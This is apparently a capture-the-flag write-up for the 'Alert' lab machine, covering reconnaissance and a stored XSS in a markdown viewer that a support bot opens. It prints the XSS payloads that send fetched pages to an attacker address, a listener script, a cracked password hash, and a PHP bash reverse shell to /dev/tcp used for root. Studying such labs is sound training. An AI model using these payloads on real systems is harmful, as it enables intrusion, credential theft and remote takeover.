---
authors:
    - Jiri Raja
date: 08-10-2025
---
# Alert

Linux machine

## Foothold

Do not forget to update the `/etc/hosts` file.

### Nmap port scan

```shell
nmap -sV -v alert.htb
```

### Getting the overall picture of the website

Visit the website... The page is a markdown viewer with some forms here and there... Make sure to notice that the about us page tells us that there is a real tech support: meaning there is a bot, that will probably read our feedback. This means that we can use the "support" somehow.

If we send a message with a url, it will get clicked (by the bot/support). We can check this by running an HTTP server (`python3 -m http.server`) and sending its url in a message (`http://attacker:8000/`).

### Subdomains
Let's use ffuf and see what's in there.
```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.alert.htb" -u http://alert.htb/ 
```
However, the initial run shows responses of different sizes. So we have to use range with some educated guess`-fs 0-350`
```
razz@kali:~/Alert$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H "Host: FUZZ.alert.htb" -u http://alert.htb/ -fs 0-350

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://alert.htb/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.alert.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 0-350
________________________________________________

statistics              [Status: 401, Size: 467, Words: 42, Lines: 15, Duration: 49ms]
:: Progress: [19966/19966] :: Job [1/1] :: 833 req/sec :: Duration: [0:00:24] :: Errors: 0 ::

```
Cool, that's a subdomain right there.

If we try to access it (add it to etc hosts first) it will require credentials we don't have.

### Directory scanning
Ok, the pages have the php page linking (http://alert.htb/index.php?page=alert), but it does not hurt to launch a default scan
```
razz@kali:~/Alert$ feroxbuster -u http://alert.htb/ --insecure -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
...
404      GET        9l       31w      271c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      274c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
302      GET       23l       48w      660c http://alert.htb/index.php => index.php?page=alert
200      GET      182l      385w     3622c http://alert.htb/css/style.css
302      GET       23l       48w      660c http://alert.htb/ => index.php?page=alert
301      GET        9l       28w      308c http://alert.htb/uploads => http://alert.htb/uploads/
301      GET        9l       28w      304c http://alert.htb/css => http://alert.htb/css/
301      GET        9l       28w      309c http://alert.htb/messages => http://alert.htb/messages/
200      GET      182l      385w     3622c http://alert.htb/css/style
[####################] - 5m    882193/882193  0s      found:7       errors:0      
[####################] - 5m    220546/220546  699/s   http://alert.htb/ 
[####################] - 5m    220546/220546  702/s   http://alert.htb/uploads/ 
[####################] - 5m    220546/220546  691/s   http://alert.htb/css/ 
[####################] - 5m    220546/220546  694/s   http://alert.htb/messages/                                                                                                                                                                                                                                                       
```
The `uploads` and `messages` returns 403. So that is interesting....

and for the PHP
```
razz@kali:~/Alert$ ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://alert.htb/index.php?page=FUZZ' -fs 690
...

contact                 [Status: 200, Size: 1000, Words: 191, Lines: 29, Duration: 49ms]
donate                  [Status: 200, Size: 1116, Words: 292, Lines: 29, Duration: 49ms]
about                   [Status: 200, Size: 1046, Words: 187, Lines: 24, Duration: 1752ms]
messages                [Status: 200, Size: 661, Words: 123, Lines: 25, Duration: 52ms]
alert                   [Status: 200, Size: 966, Words: 201, Lines: 29, Duration: 48ms]
:: Progress: [220560/220560] :: Job [1/1] :: 833 req/sec :: Duration: [0:04:44] :: Errors: 0 ::

```
Again... messages

## User

So let's try exploiting the markdown renderer.

If we upload a file with some plain text, it is rendered and we can share a link to it.

We can start by searching for php markdown renderers' exploits. We will find https://fluidattacks.com/advisories/noisestorm/, which most likely isn't this tool, however, it can give us an example of an exploit of a stored XSS.

Stored XSS, option to share a link to it, and a bot that will open it? Sounds like we have the attack vector.

So the exploit is:

1. Start a listener that can do more then just get requests `nc -lnvp 80`

2. POST to /visualizer.php
    ```    
    Content-Disposition: form-data; name="file"; filename="test.md"
    Content-Type: text/markdown
    
     r.text()).then(d => fetch('http://10.10.14.3/log', {method: 'POST', body: d}))">
    ```

3. POST to contact.php (adjust link_share with response from the first request)
    ```
    email=test%40test.test&message=http://alert.htb/visualizer.php?link_share=67938dd02e0d46.12129018.md
    ```

However, soon we will hit limitations like CORS protection. We can use the following server to accept the requests (AI generated):
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        # Log the path and headers
        print(f"Path: {self.path}")
        print(f"Headers: {self.headers}")
        
        # Read the POST data
        content_length = int(self.headers.get('Content-Length', 0))  # Get the size of the POST data
        post_data = self.rfile.read(content_length).decode('utf-8')  # Read and decode the data
        
        # Log the data
        print(f"POST data: {post_data}")
        
        # Send a response
        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        
        # Respond with a JSON object
        response = {"status": "success", "message": "Data received"}
        self.wfile.write(json.dumps(response).encode('utf-8'))

    def do_OPTIONS(self):
        # Log the OPTIONS request
        print(f"OPTIONS request received for path: {self.path}")
        
        # Send a response with CORS headers
        self.send_response(204)  # No Content
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()

def run(server_class=HTTPServer, handler_class=SimpleHTTPRequestHandler, port=80):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print(f"Starting server on port {port}...")
    httpd.serve_forever()

if __name__ == "__main__":
    run()
```

We can abuse the fact that we want to search for .htaccess or .htpasswd for the statistics subdomain. Upload the following md file:
```
 response.text().then(data => {
  // Log success data
  fetch('http://10.10.14.5/log', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      status: response.status,
      statusText: response.statusText,
      body: data
    })
  });
}))
.catch(error => {
  // Log error details
  fetch('http://10.10.14.5/log', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      error: error.toString(),
      message: 'Failed to fetch',
      url: '/messages'
    })
  });
});
">
```

Now that our python server is listening, we can trigger the bot.

We will receive:
```
POST data: {"status":200,"statusText":"OK","body":"<pre>albert:$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/\n</pre>\n"}
10.10.11.44 - - [24/Jan/2025 10:41:18] "POST /log HTTP/1.1" 200 -
```

Take the hash (do not forget the forward slash at the end):
```shell
hashcat -a 0 -m 1600 hash /usr/share/wordlists/rockyou.txt
```

We get: `$apr1$bMoRBJOg$igG8WBtQ1xYDTQdLjSWZQ/:manchesterunited`.

Now we can login to the statistics page. Or we can use the credentials for ssh:
```shell
ssh albert@alert.htb
```

Get the user hash.

## Root
Download [linpeas](https://github.com/peass-ng/PEASS-ng) (using python http server) or use `ss -plnt` or list processes to find the local running server.

Forward it to your host `ssh -L 127.0.0.1:8000:127.0.0.1:8080 albert@alert.htb`.

Access the page at localhost:8000. Nothing interesting.

Check the `/opt` directory, we find `/opt/website-monitor` and inside is `/opt/website-monitor/config` writeable directory by management group (currently us).

We can also see in running processes (`ps aux`) the following:
```bash
inotifywait -m -e modify --format %w%f %e /opt/website-monitor/config
```

If we modify the `/opt/website-monitor/config/configuration.php` it gets replaced by the original file after few seconds (3 precisely).

We can either modify the file and trigger it from the browser (refresh/access the forwarded `http://localhost:8000/`). Or use the intended path which is letting the bot running under the root user execute the file for us.

So start a shell on the attacker:
```bash
nc -nvlp 1234
```

Modify `configuration.php`:

```php
<?php
exec("/bin/bash -c 'bash -i > /dev/tcp/<ATTACKER-IP>/1234 0>&1'");
?>
```

Now we have a shell.

Get the root flag.
